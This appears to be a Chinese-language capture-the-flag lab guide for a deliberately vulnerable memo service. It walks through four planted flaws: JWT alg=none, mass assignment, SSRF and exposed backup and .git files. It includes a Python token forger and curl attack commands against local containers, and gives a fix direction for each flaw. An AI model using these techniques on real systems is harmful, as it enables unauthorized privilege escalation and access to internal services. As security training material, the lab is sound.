# Lab B3 · 內部備忘錄系統

下篇的實戰 Lab。三個洞、三條 flag、三個修補；補丁不是重建容器，而是**上傳一個檔案到指定路徑**，平台 apply 之後回你 checks。

```
memo（8101，對外）            ← 登入發 JWT、個人資料、備忘錄、內網代理
admin（只內網，沒有對外埠）    ← 只有 memo 的 /fetch 走得到
補丁台（8103）                ← 交 flag、上傳補丁、看 checks
```

---

## 1. 起跑

```bash
cd labs/lab-b3
docker compose up -d --build
docker compose ps                # 3 個 Up：memo / admin / patchboard
```

| 服務 | 網址 | 是什麼 |
|---|---|---|
| memo | http://localhost:8101 | 內部備忘錄：登入、個人資料、備忘錄、`/fetch` 代抓網址 |
| admin | （沒有對外埠） | 內部系統：`/ping`、`/flag` |
| 補丁台 | http://localhost:8103 | 交 flag、上傳補丁、看 checks |

示範帳號：`demo / demo`。**admin 的密碼每一輪都會被換掉**，你不會知道——要當 admin，只能走下面兩個洞。

---

## 2. 規則

- **四個洞、三條 flag + 一個純修補**，各自計分：

  | 洞 | 位置 | 拿到什麼 |
  |---|---|---|
  | JWT alg=none | 驗 token 時，header 寫 `alg=none` 就當真 | flag1（`/admin/panel` 的身分區） |
  | Mass assignment | `PATCH /api/profile` 把 JSON 全部寫進 users | flag2（`/admin/panel` 的帳號區） |
  | SSRF | `GET /fetch?url=` 沒有白名單 | flag3（內網 admin 的 `/flag`） |
  | A05 設定錯誤 | `/app.py.bak`、`/.git/config` 忘了刪 | **沒有 flag**，只有「修補 +1」 |

- **攻破 +1**：把某一條 flag 交到補丁台，一個洞一條，同一條本輪只算一次（A05 沒有 flag，不計攻破）。
- **修補 +1**：上傳改好的 `handlers.py`，選你要修的那個洞，通過它的 checks 才算。
- **flag 每 120 秒換一次**（三條一起換，`demo` 的 role 也會復位）。
- 修補失敗不扣分，也不回收你已經拿到的修補分。

**攻擊挑一條就夠，防守要三條都補。**

### `/admin/panel` 為什麼有兩區

管理台把「你是誰」分成兩個來源，各信一半：

- **身分區**：只看 JWT 裡的 `role` claim —— 洞 1 打這裡。
- **帳號區**：只看資料庫裡**你自己那一列**的 `role` —— 洞 2 打這裡。（`admin` 這帳號的 role 是 `user`，偽造它的票也只開身分區。）

（真實系統裡「token 說的話」和「資料庫說的話」對不上，就是很多越權的起點。）

---

## 3. 三個任務

### 任務 1 · JWT alg=none（flag1）

登入拿一張票（`-i` 會看到 `X-Token`，cookie 裡也有）：

```bash
curl -s -i -d 'username=demo&password=demo' http://localhost:8101/login | grep -i x-token
```

自己造一張：header 寫 `alg=none`、payload 改 `role=admin`、簽章留空。

```python
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
print(b({"alg": "none", "typ": "JWT"}) + "." + b({"sub": "demo", "role": "admin"}) + ".")
```

```bash
curl -H "Authorization: Bearer <上面那串>" http://localhost:8101/admin/panel
```

**修補方向**：演算法固定 HS256（不要相信 header 說自己是什麼），簽章一定要驗，`alg=none` 直接拒絕。

### 任務 2 · Mass assignment（flag2）

`PATCH /api/profile` 把 body 的 key 全部當成欄位寫進 `users`——包含 `role`：

```bash
curl -s -c /tmp/ck -d 'username=demo&password=demo' http://localhost:8101/login
curl -b /tmp/ck -X PATCH -H 'Content-Type: application/json' \
     -d '{"role":"admin","bio":"pwned"}' http://localhost:8101/api/profile
curl -b /tmp/ck http://localhost:8101/admin/panel      # 帳號區
```

**修補方向**：欄位白名單——只准改 `bio`、`email`，其他 key 一律忽略（不要只在前面擋一次，要按白名單挑）。

### 任務 3 · SSRF（flag3）

`/fetch?url=` 直接 `requests.get`，沒有任何白名單。admin 只放在內網，但 memo 打得到它：

```bash
curl 'http://localhost:8101/fetch?url=http://admin:8000/ping'   # pong（正常功能）
curl 'http://localhost:8101/fetch?url=http://admin:8000/flag'   # 內網的 flag3
```

**修補方向**：白名單——只放行功能真的需要的那一條（`http://admin:8000/ping`），其他回 403。注意功能也要顧：ping 還是要回 pong。

### 任務 4 · A05：忘了刪的檔案（沒有 flag，只有修補）

部署時留了兩個不該留的東西，直接從網頁讀得到：

```bash
curl -s http://localhost:8101/app.py.bak | head -20     # 整份 handlers.py，含 SECRET = "dev"
curl -s http://localhost:8101/.git/config               # 遠端網址、分支設定
```

`app.py.bak` 裡面就是這支服務的原始碼：`SECRET = "dev"`、三個洞的註解、JWT 怎麼簽——拿到它等於拿到一份地圖（順便驗證了任務 1 為什麼做得起來）。

**修補方向**：這些路徑不該由服務提供。真的修法是把它們從部署目錄刪掉；程式層至少不要路由到它們，一律回 404。修完再測：

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8101/app.py.bak     # 404
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8101/.git/config   # 404
```

---

## 4. 上傳補丁

補丁台（http://localhost:8103）右邊那張卡：

| 欄位 | 填什麼 |
|---|---|
| 洞 | jwt / massassign / ssrf / misconfig（你要修哪一個） |
| target | `handlers.py`（只收這個檔名，其他回 400；單檔上限 256KB） |
| file | 你改好的 `handlers.py` |

按 **upload & apply**，下面會列出三個洞的 checks。**只有你選的那個洞全 pass，那個洞才 +1**。

| 洞 | 功能類 | 攻擊類 |
|---|---|---|
| jwt | health、demo/demo 登入、`GET /memo/1` 200、demo 自己看 `/admin/panel` 200 | `alg=none` 的票進 `/admin/panel` 拿不到 flag1 |
| massassign | 同上 ＋ `PATCH {"bio":…}` 回 200 且 role 不變 | `PATCH {"role":"admin"}` 之後 role 還是 user（拿不到 flag2） |
| ssrf | 同上 ＋ `fetch?url=http://admin:8000/ping` 回 pong | `fetch?url=http://admin:8000/flag` 拿不到 flag3 |
| misconfig | 同上 | `/app.py.bak` 與 `/.git/config` 都要回 **404** |

服務偵測到檔案變了會自己重載，**不用重建容器**。想知道補丁有沒有生效：`curl localhost:8101/_version`（`loaded` 應該等於 `file`）。

---

## 5. 常卡住的地方

| 症狀 | 原因 |
|---|---|
| `apply` 後所有 checks 都 fail | 你的檔案有語法錯誤，補丁台會把載入錯誤寫在訊息裡 |
| 修好一個洞，另一個洞的 checks 變紅 | 你的補丁把之前修好的那個洞又打開了（回到舊版檔案） |
| JWT 那關一直 fail | 你的驗證函式還在看 `alg=none`，或忘了比對簽章 |
| mass assignment 那關一直 fail | 你只擋了「role」這個字串，沒有做成白名單 |
| SSRF 那關 fetch 正常 fail | 白名單連 `ping` 都擋掉了（功能要留） |
| `demo` 的 role 自己變回 user | 換 flag 時補丁台會把它復位 |
| A05 那關一直 fail | 檢查是不是回 403 而不是 404；備份檔真的刪掉、路由也要拿掉 |
| flag 說過期 | 120 秒換一次，重讀再交 |
| `docker compose up --build` 卡在 buildx 權限 | 這個環境的限制：`DOCKER_BUILDKIT=0 docker build -t lab-b3-memo ./memo`（admin、patchboard 同理）再 `docker compose up -d` |

---

## 6. 收工

```bash
docker compose down          # 保留計數
docker compose down -v       # 清乾淨：DB、程式碼目錄、flag 都回到種子狀態
```

> 這是教學 Lab：`docker exec` 進去看檔案就看得到答案。**不要那樣做**——你騙到的只有自己，真賽裡你只有網路。
